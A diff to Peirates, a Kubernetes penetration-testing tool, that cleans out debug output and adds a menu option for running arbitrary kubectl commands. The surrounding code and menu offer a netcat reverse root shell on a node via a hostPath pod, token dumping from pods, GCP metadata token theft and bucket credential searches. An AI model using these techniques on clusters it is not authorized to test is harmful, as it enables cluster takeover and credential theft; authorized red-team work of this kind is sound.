@@ -6,10 +6,6 @@
 //
 package peirates
 
-// Imports. If you don't use an import that's an error so
-// I haven't imported json yet.
-// Also, number one rule of Go: Try to stick to the
-// standard library as much as possible
 import (
 	"bufio"
 	"bytes"
@@ -27,8 +23,8 @@ import (
 	"strconv"
 
 	// HTTP client/server
-	"net/http"
-	"net/url"
+	"net/http" // HTTP requests
+	"net/url"  // URL encoding
 	"os/exec"
 	"regexp"
 	"strings"
@@ -46,15 +42,11 @@ func getPodList(connectionString ServerInfo) []string {
 		return []string{}
 	}
 
-	println("DEBUG: Made it past auth check")
-
 	responseJSON, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
 	if err != nil {
 		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
 		return []string{}
 	}
-
-	println("DEBUG: Made it past get pods -o json")
 
 	type PodsResponse struct {
 		Items []struct {
@@ -66,8 +58,6 @@ func getPodList(connectionString ServerInfo) []string {
 
 	var response PodsResponse
 	json.Unmarshal(responseJSON, &response)
-
-	println("DEBUG: Made it json.Unmarshall")
 
 	if err != nil {
 		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
@@ -149,21 +139,6 @@ func GetGCPBearerTokenFromMetadataAPI(account string) string {
 	} else {
 		println("[-] Error - could not find token in returned body text: ", string(reqTokenRaw))
 		return "ERROR"
-	}
-}
-
-//
-// getHostname runs kubectl with connection string to get hostname from pod
-// In the medium term, this function will disappear
-//
-func getHostname(connectionString ServerInfo, PodName string) string {
-
-	hostname, _, err := runKubectlSimple(connectionString, "exec", "-it", PodName, "hostname")
-	if err != nil {
-		println("[-] Checking for hostname of pod "+PodName+" failed: ", err)
-		return "[-] Pod command exec failed for " + PodName + "\n"
-	} else {
-		return "[+] Pod discovered: " + string(hostname)
 	}
 }
 
@@ -322,8 +297,6 @@ func PrintNamespaces(connectionString ServerInfo) []string {
 	}
 
 	var namespaces []string
-
-	// TODO: Add checking to make sure you're authorized to get namespaces
 
 	NamespacesRaw, _, err := runKubectlSimple(connectionString, "get", "namespaces")
 	if err != nil {
@@ -655,6 +628,8 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 	// TODO: changing parsing to occur via JSON
 	// TODO: check that image exists / handle failure by trying again with the next youngest pod's image or a named pod's image
 
+	// TODO: Create approach 2
+
 	// Approach 1: Try to get the image file for my own pod
 	//./kubectl describe pod `hostname`| grep Image:
 	hostname := os.Getenv("HOSTNAME")
@@ -723,9 +698,8 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 			}
 			if !matched {
 				//added checking to only enumerate running pods
-				// BUG: Did we do this? Check.
+				// TODO: check for potential bug: did we enumerate only running pods as intended?
 				MountInfoVars.image = strings.Fields(line)[7]
-				//println("[+] This is the MountInfoVars.Image output: ", MountInfoVars.image)
 			}
 		}
 	}
@@ -877,7 +851,7 @@ func banner(connectionString ServerInfo) {
 ,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 ________________________________________
-	Peirates v1.0.17 by InGuardians
+	Peirates v1.0.20 by InGuardians
   https://www.inguardians.com/peirates
 ----------------------------------------------------------------`)
 
@@ -919,9 +893,8 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 	if !kubectlAuthCanI(connectionString, "get", "nodes") {
 		println("[-] Permission Denied: your service account isn't allowed to get nodes")
 		return
-	} else {
-		println("DEBUG: passed auth checks")
 	}
+
 	nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
 	println(nodeDetailOut)
 
@@ -1077,7 +1050,10 @@ Compromise |
 [20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod
 [21] Run command in one or all pods in this namespace via the API Server (RBAC permitting)
 [22] Run a token-dumping command in all pods via Kubelets (authorization/Webhook permitting)
-
+-----------------+
+Off-Menu         +
+-----------------+
+[0] Run a kubectl command in the current namespace and service account context [beta]
 
 [exit] Exit Peirates 
 ----------------------------------------------------------------
@@ -1107,6 +1083,54 @@ Peirates:># `)
 		case "exit":
 			os.Exit(0)
 
+		//	[0] Run a kubectl command in the current namespace, API server and service account context
+		case "0":
+			println(`
+This function allows you to run a kubectl command, with only a few restrictions.
+
+Your command must not:
+
+- change namespace
+- specify a different service account 
+- change nameservers
+- run for longer than a few seconds (as in kubectl exec)
+
+Your command will crash this program if it is not permitted.
+
+These requirements are dynamic - watch new versions for changes.
+
+Leave off the "kubectl" part of the command.  For example:
+
+- get pods
+- get pod podname -o yaml
+- get secret secretname -o yaml
+
+`)
+
+			fmt.Printf("Please enter a kubectl command: ")
+			input, _ = readLine()
+
+			arguments := strings.Fields(input)
+			for _, arg := range arguments {
+				println("Argument:", arg)
+			}
+			// TODO: Create an authorization check
+			// if !kubectlAuthCanI(connectionString, "get", "secret") {
+			//	println("[-] Permission Denied: your service account isn't allowed to get secrets")
+			//	break
+			//}
+
+			// func runKubectlSimple(cfg ServerInfo, cmdArgs ...string) ([]byte, []byte, error) {
+			kubectlOutput, _, err := runKubectlSimple(connectionString, arguments...)
+			if err != nil {
+				println("[-] Could not perform action")
+				break
+			}
+			kubectlOutputLines := strings.Split(string(kubectlOutput), "\n")
+			for _, line := range kubectlOutputLines {
+				println(line)
+			}
+			break
 		// [1] Enter a different service account token
 		case "1":
 			fmt.Printf("\nCurrent primary service account: %s\n\n[1] List service accounts\n[2] Select primary service account\n[3] Add new service account\n[4] Export service accounts to JSON\n[5] Import service accounts from JSON\n", connectionString.TokenName)
@@ -1266,7 +1290,7 @@ Peirates:># `)
 				println("[+] Getting volume mounts for all pods")
 				// BUG: Need to make it so this Get doesn't print all info even though it gathers all info.
 				PrintHostMountPoints(podInfo)
-				//println("[+] Attempting to Mounting RootFS......")
+
 				//MountRootFS(allPods, connectionString)
 			case "2":
 				println("[+] Please provide the pod name: ")
@@ -1278,20 +1302,13 @@ Peirates:># `)
 		// [20] Gain a reverse rootshell by launching a hostPath / pod
 		case "20":
 			allPods := getPodList(connectionString)
-			// TODO: See if we can put the auth check back
-			//podCreation := canCreatePods(connectionString)
-			//podCreation:= true
-			//if ! podCreation {
-			//	println(" This token cannot create pods on the cluster")
-			//	break
-			//}
-			//crontabPersistExec(allPods, connectionString)
 			println("What IP and Port will your netcat listener be listening on?")
 			var ip, port string
 			println("IP:")
 			fmt.Scanln(&ip)
 			println("Port:")
 			fmt.Scanln(&port)
+			// TODO: Rename/refactor MountRootFS so we get more capabilities in case the node does not run cron
 			MountRootFS(allPods, connectionString, ip, port)
 			break
 
@@ -1447,6 +1464,7 @@ Peirates:># `)
 			// In every bucket URL, look at the objects
 			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
 			// We use the same headers[] from the previous GET request.
+		eachbucket:
 			for _, line := range bucketUrls {
 				println("Checking bucket for credentials:", line)
 				urlListObjects := line + "/o"
@@ -1472,8 +1490,7 @@ Peirates:># `)
 							// We use the same headers[] from the previous GET request.
 							bodyToken := GetRequest(saTokenUrl, headers, false)
 							if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
-								continue
-								// TODO: mark the continue point
+								continue eachbucket
 							}
 							tokenLines := strings.Split(string(bodyToken), "\n")
 							// TODO: Do we need to check status code?  if respToken.StatusCode != 200 {
@@ -1512,14 +1529,13 @@ Peirates:># `)
 			break
 		// [21] Run command in one or all pods in this namespace
 		case "21":
-			banner(connectionString)
+
 			println("\n[1] Run command on a specific pod\n[2] Run command on all pods")
 			fmt.Scanln(&input)
 			println("[+] Please provide the command to run in the pods: ")
 
 			cmdOpts.commandToRunInPods, _ = readLine()
 
-			println("DEBUG: Running command ", cmdOpts.commandToRunInPods)
 			switch input {
 			case "1":
 				println("[+] Please provide the specified pod to run the command: ")
@@ -1530,13 +1546,11 @@ Peirates:># `)
 
 				if cmdOpts.commandToRunInPods != "" {
 					if len(cmdOpts.podsToRunTheCommandIn) > 0 {
-						// BUG: execInListPods and execInAllPods both need to be able to split the command on whitespace
 						execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
 					}
 				}
 			case "2":
 				var input string
-				println("DEBUG: Made it into case 2")
 				if cmdOpts.commandToRunInPods != "" {
 					println("About to run execInAllPods")
 					execInAllPods(connectionString, cmdOpts.commandToRunInPods)
@@ -1557,39 +1571,4 @@ Peirates:># `)
 		}
 		clearScreen()
 	}
-	//---------------------------------------------------------
-	//	parseOptions(&cmdOpts)
-
-	//	if inAPod(connectionString) {
-	//		println("+ You are in a pod.")
-	//	} else {
-	//		println("- You are not in a Kubernetes pod.")
-	//	}
-
-	//	allPods := getPodList(connectionString)
-
-	//GetRoles(connectionString, &kubeRoles)
-	//GetPodsInfo(connectionString, &podInfo)
-	//PrintHostMountPoints(podInfo)
-	//PrintHostMountPointsForPod(podInfo, "attack-daemonset-6fmjc")
-	//for _, pod := range allPods {
-	// JAY / TODO: Put me back
-	//	println("Running a hostname command in pod: " + pod)
-	//	print(getHostname(connectionString, pod))
-	//}
-	//if cmdOpts.commandToRunInPods != "" {
-	//	if len(cmdOpts.podsToRunTheCommandIn) > 0 {
-	//		execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
-	//	} else {
-	//		execInAllPods(connectionString, cmdOpts.commandToRunInPods)
-	//	}
-	//}
-	//podCreation := canCreatePods(connectionString)
-	//if podCreation {
-	//	println("+ This token can create pods on the cluster")
-	//} else {
-	//	println(" This token cannot create pods on the cluster")
-	//}
-	//MountRootFS(allPods, connectionString)
-
 }
